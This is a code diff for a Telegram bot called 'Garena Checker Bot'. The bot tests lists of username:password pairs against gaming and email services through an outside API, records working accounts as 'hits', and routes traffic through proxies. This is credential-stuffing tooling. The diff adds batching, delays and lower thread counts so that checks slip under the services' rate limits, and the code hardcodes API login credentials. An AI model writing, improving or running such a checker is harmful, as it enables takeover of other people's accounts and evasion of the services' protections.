@@ -43,10 +43,10 @@ class RenderHandler(BaseHTTPRequestHandler):
 <html>
 <head><title>Garena Checker Bot</title></head>
 <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
-<h1>Garena Checker Bot V4.9</h1>
+<h1>Garena Checker Bot V5.0</h1>
 <p>Status: <b style="color:#00ff00;">ALIVE</b></p>
 <p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
-<p>Version: <b>4.9 - FULL INFO FIX</b></p>
+<p>Version: <b>5.0 - SUPER VIP</b></p>
 </body>
 </html>"""
             self.wfile.write(html.encode('utf-8'))
@@ -89,9 +89,16 @@ API_BASE = "https://lol.nhatminh301.com"
 API_USERNAME = "thaituduc"
 API_PASSWORD = "thaituduc"
 
-DEFAULT_THREADS = 100
+DEFAULT_THREADS = 50  # Giảm threads để tăng delay giữa các request
 DEFAULT_TIMEOUT = 60
 DEFAULT_RETRIES = 3
+DEFAULT_DELAY = 0.5  # Delay mặc định giữa các request (giây)
+
+# Delay config cho checkmulti
+CHECKMULTI_THREADS = 20  # Threads thấp hơn để tránh rate limit
+CHECKMULTI_DELAY = 1.0  # Delay giữa mỗi request (giây)
+CHECKMULTI_BATCH_SIZE = 10  # Số acc check mỗi batch
+CHECKMULTI_BATCH_DELAY = 5.0  # Delay giữa các batch (giây)
 
 OUTPUT_HITS = "hits.txt"
 OUTPUT_DEAD = "dead.txt"
@@ -169,7 +176,23 @@ bot_start_time = datetime.now()
 cache_results = {}
 cache_lock = threading.Lock()
 
+# Rate limiter
+rate_lock = threading.Lock()
+last_request_time = 0
+
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
+
+# ========== RATE LIMITER ==========
+def rate_limit(delay=DEFAULT_DELAY):
+    """Đảm bảo delay giữa các request"""
+    global last_request_time
+    with rate_lock:
+        current_time = time.time()
+        time_since_last = current_time - last_request_time
+        if time_since_last < delay:
+            sleep_time = delay - time_since_last
+            time.sleep(sleep_time)
+        last_request_time = time.time()
 
 # ========== FIX ENCODING NÂNG CAO ==========
 def fix_encoding(text):
@@ -638,8 +661,11 @@ def format_value(value):
     return value
 
 # ========== CHECK API ==========
-def check_account_api(username, password, service):
+def check_account_api(username, password, service, use_delay=True):
     """Gọi API kiểm tra tài khoản"""
+    if use_delay:
+        rate_limit(DEFAULT_DELAY)
+    
     cache_key = f"{username}:{password}:{service}"
     with cache_lock:
         if cache_key in cache_results:
@@ -1018,7 +1044,7 @@ def check_single(chat_id, username, password, service="lienquan"):
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
     
-    result = check_account_api(username, password, service)
+    result = check_account_api(username, password, service, use_delay=False)
     result_type = result.get("result", "unknown")
     
     save_result(username, password, result_type, service)
@@ -1031,9 +1057,9 @@ def check_single(chat_id, username, password, service="lienquan"):
     else:
         safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")
 
-# ========== CHECK NHIỀU ==========
+# ========== CHECK NHIỀU (CHECKMULTI) - SUPER VIP ==========
 def check_batch(chat_id, accounts, service):
-    """Kiểm tra nhiều tài khoản"""
+    """Kiểm tra nhiều tài khoản với delay và batch"""
     global checking, stats
     
     if checking:
@@ -1061,19 +1087,33 @@ def check_batch(chat_id, accounts, service):
         proxy_count = len(proxy_list)
     
     safe_send_message(chat_id, f"""
-{icon} <b>BAT DAU CHECK</b>
+{icon} <b>BAT DAU CHECK - SUPER VIP</b>
 📊 Tong: <code>{total}</code> accounts
 🎯 Service: <b>{service_desc}</b>
-⚡ Threads: <code>{DEFAULT_THREADS}</code>
+⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
+⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
+📦 Batch Size: <code>{CHECKMULTI_BATCH_SIZE}</code>
 🌐 Proxy: <code>{proxy_count}</code>
 """)
+    
+    # Chia accounts thành các batch
+    batches = []
+    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
+        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
+        batches.append(batch)
+    
+    total_batches = len(batches)
+    batch_num = 0
     
     def process_single(user, pwd):
         """Xử lý một tài khoản"""
         if stop_event.is_set():
             return
         
-        result = check_account_api(user, pwd, service)
+        # Apply delay trước mỗi request
+        rate_limit(CHECKMULTI_DELAY)
+        
+        result = check_account_api(user, pwd, service, use_delay=False)
         result_type = result.get("result", "unknown")
         
         save_result(user, pwd, result_type, service)
@@ -1092,30 +1132,46 @@ def check_batch(chat_id, accounts, service):
                 stats["dead"] += 1
             else:
                 stats["errors"] += 1
+    
+    # Xử lý từng batch
+    for batch in batches:
+        if stop_event.is_set():
+            break
+        
+        batch_num += 1
+        
+        # Gửi thông báo batch
+        safe_send_message(chat_id, f"""
+📦 <b>BATCH {batch_num}/{total_batches}</b>
+🔍 Dang check {len(batch)} acc...
+""")
+        
+        # Check batch hiện tại
+        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
+            futures = {executor.submit(process_single, user, pwd): (user, pwd) 
+                       for user, pwd in batch}
             
-            if stats["checked"] % 50 == 0:
-                try:
-                    elapsed = time.time() - stats["start_time"]
-                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
-                    percent = (stats["checked"] / total) * 100
-                    safe_send_message(chat_id, f"""
-📊 <b>TIEN DO</b>
-✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
-🎯 Hits: <code>{stats['hits']}</code>
+            for future in as_completed(futures):
+                if stop_event.is_set():
+                    executor.shutdown(wait=False)
+                    break
+        
+        # Cập nhật progress
+        elapsed = time.time() - stats["start_time"]
+        speed = stats["checked"] / elapsed if elapsed > 0 else 0
+        percent = (stats["checked"] / total) * 100
+        
+        safe_send_message(chat_id, f"""
+📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
+✅ Hits: <code>{stats['hits']}</code>
 ❌ Dead: <code>{stats['dead']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s
+⏱ Elapsed: <code>{elapsed:.1f}s</code>
 """)
-                except:
-                    pass
-    
-    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
-        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
-                   for user, pwd in accounts}
         
-        for future in as_completed(futures):
-            if stop_event.is_set():
-                executor.shutdown(wait=False)
-                break
+        # Delay giữa các batch
+        if batch_num < total_batches:
+            time.sleep(CHECKMULTI_BATCH_DELAY)
     
     checking = False
     elapsed = time.time() - stats["start_time"]
@@ -1125,6 +1181,7 @@ def check_batch(chat_id, accounts, service):
 📊 Tong: <code>{stats['total']}</code>
 🎯 HIT: <code>{stats['hits']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
+⚠️ ERROR: <code>{stats['errors']}</code>
 ⏱ Thoi gian: <code>{elapsed:.1f}s</code>
 """)
     
@@ -1174,7 +1231,9 @@ def check_all_services(chat_id, accounts):
         if stop_event.is_set():
             return
         
-        result = check_account_api(user, pwd, service)
+        rate_limit(DEFAULT_DELAY)
+        
+        result = check_account_api(user, pwd, service, use_delay=False)
         result_type = result.get("result", "unknown")
         
         save_result(user, pwd, result_type, service)
@@ -1225,7 +1284,7 @@ def cmd_start(message):
         proxy_count = len(proxy_list)
     
     safe_send_message(message.chat.id, f"""
-🤖 <b>GARENA CHECKER BOT V4.9</b>
+🤖 <b>GARENA CHECKER BOT V5.0 - SUPER VIP</b>
 👤 Admin: @baohuyno1
 🌐 Proxy: {proxy_count}
 
@@ -1235,11 +1294,17 @@ def cmd_start(message):
 /check user:pass - Check 1 acc
 /check user|pass - Check 1 acc (dau |)
 /check user:pass service - Check 1 acc theo service
-/checkmulti user1:pass1,user2:pass2 - Check nhieu acc
+/checkmulti user1:pass1,user2:pass2 - Check nhieu acc (Super VIP)
 /checkall - Check tat ca acc dang cho
 
 <b>SERVICE:</b>
 lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
+
+⚡ <b>CHECKMULTI SUPER VIP:</b>
+- Threads: {CHECKMULTI_THREADS}
+- Delay: {CHECKMULTI_DELAY}s/request
+- Batch: {CHECKMULTI_BATCH_SIZE} acc/batch
+- Batch Delay: {CHECKMULTI_BATCH_DELAY}s
 """)
 
 @bot.message_handler(commands=['check'])
@@ -1282,7 +1347,7 @@ Cac service: {', '.join(SERVICE_ROUTES.keys())}
 
 @bot.message_handler(commands=['checkmulti'])
 def cmd_checkmulti(message):
-    """Lệnh /checkmulti - Hỗ trợ nhiều định dạng"""
+    """Lệnh /checkmulti - Super VIP với delay và batch"""
     if not check_membership(message):
         return
     
@@ -1338,9 +1403,12 @@ Format: user:pass hoặc user|pass
     total = len(accounts)
     
     safe_send_message(message.chat.id, f"""
-📊 <b>CHECK NHIEU ACC</b>
+📊 <b>CHECK NHIEU ACC - SUPER VIP</b>
 🎯 Tong: <code>{total}</code> accounts
 🎮 Service: <b>{SERVICE_ROUTES[service]['desc']}</b>
+⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
+⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
+📦 Batch: <code>{CHECKMULTI_BATCH_SIZE}</code> acc/batch
 
 Dang bat dau check...
 """)
@@ -1478,10 +1546,10 @@ def cmd_report(message):
     except:
         safe_send_message(message.chat.id, "❌ Chua co report!")
 
-# ========== XỬ LÝ TEXT ==========
+# ========== XỬ LÝ TEXT - KHÔNG GỬI THÔNG BÁO LỖI ==========
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
-    """Xử lý tin nhắn văn bản"""
+    """Xử lý tin nhắn văn bản - im lặng nếu không tìm thấy acc"""
     if not check_membership(message):
         return
     
@@ -1499,14 +1567,7 @@ def handle_text(message):
     accounts, stats_loc = loc_tk_mk_only(text_input)
     
     if not accounts:
-        safe_send_message(chat_id, """
-❌ KHONG TIM THAY TAI KHOAN!
-
-Dung lenh:
-/check user:pass - Check 1 acc
-/check user|pass - Check 1 acc (dau |)
-/checkmulti user1:pass1,user2:pass2 - Check nhieu acc
-""")
+        # Không gửi thông báo lỗi để tránh phiền người dùng
         return
     
     if chat_id not in pending_accounts:
@@ -1613,13 +1674,15 @@ Preview (20 dong dau):
 def main():
     """Hàm chính khởi động bot"""
     print("=" * 60)
-    print("    GARENA CHECKER BOT V4.9 - FULL INFO FIX")
+    print("    GARENA CHECKER BOT V5.0 - SUPER VIP")
     print("    ADMIN: @baohuyno1")
     print("    HO TRO | VA :")
     print("    KENH BAT BUOC: @hakiiosvip")
     print("=" * 60)
-    print(f"[*] Threads: {DEFAULT_THREADS}")
-    print(f"[*] Timeout: {DEFAULT_TIMEOUT}s")
+    print(f"[*] Threads: {CHECKMULTI_THREADS}")
+    print(f"[*] Delay: {CHECKMULTI_DELAY}s")
+    print(f"[*] Batch Size: {CHECKMULTI_BATCH_SIZE}")
+    print(f"[*] Batch Delay: {CHECKMULTI_BATCH_DELAY}s")
     print(f"[*] Services: {len(SERVICE_ROUTES)}")
     print(f"[*] API Base: {API_BASE}")
     print(f"[*] Required Channel: {REQUIRED_CHANNEL}")
